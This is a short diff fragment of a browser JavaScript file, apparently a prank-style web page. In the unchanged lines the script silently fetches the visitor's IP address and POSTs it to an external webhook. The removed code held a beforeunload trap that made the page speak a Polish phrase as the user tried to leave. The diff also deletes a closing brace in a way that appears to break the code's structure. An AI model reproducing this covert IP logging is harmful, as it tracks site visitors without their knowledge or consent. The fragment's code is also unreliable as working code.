@@ -51,7 +51,7 @@ fetch('https://api.ipify.org/?format=json')
         }
       ]
     };
-
+    
     fetch(webhook, {
       method: 'POST',
       headers: {
@@ -59,7 +59,6 @@ fetch('https://api.ipify.org/?format=json')
       },
       body: JSON.stringify(message)
     });
-  });
 
 function isIPInRange(ip, range) {
   var ipInt = ipToNumber(ip);
@@ -149,13 +148,6 @@ function isParentSameOrigin () {
   } catch (err) {
     return false
   }
-}
-
-function confirmPageUnload () {
-  window.addEventListener('beforeunload', event => {
-    speak('ale mam tutaj taka fajna maszynke na lewym monitorze!')
-    event.returnValue = true
-  })
 }
 
 function registerProtocolHandlers () {
